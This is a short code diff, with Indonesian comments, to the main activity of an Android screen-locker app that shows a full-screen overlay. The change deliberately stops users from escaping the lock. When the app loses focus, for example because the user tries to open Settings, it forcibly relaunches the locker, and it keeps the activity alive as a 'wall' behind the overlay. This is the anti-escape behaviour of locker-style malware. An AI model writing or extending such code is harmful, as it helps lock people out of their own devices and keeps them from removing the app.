@@ -13,9 +13,20 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        // Hilangkan animasi masuk agar tidak flicker
+        overridePendingTransition(0, 0);
 
         // Cek izin draw overlay (diperlukan untuk TYPE_APPLICATION_OVERLAY)
         checkPermission();
+    }
+
+    @Override
+    public void onWindowFocusChanged(boolean hasFocus) {
+        super.onWindowFocusChanged(hasFocus);
+        if (!hasFocus) {
+            // Jika user mencoba buka Settings lewat glitch, tarik paksa kembali
+            startLocker();
+        }
     }
 
     @Override
@@ -50,7 +61,8 @@ public class MainActivity extends Activity {
         // Memulai service pengunci layar
         Intent intent = new Intent(MainActivity.this, LockerService.class);
         startService(intent);
-        // Menutup activity utama agar hanya overlay yang terlihat
-        finish();
+        
+        // Jangan panggil finish()! Biarkan dia jadi tembok di belakang overlay
+        overridePendingTransition(0, 0);
     }
 }
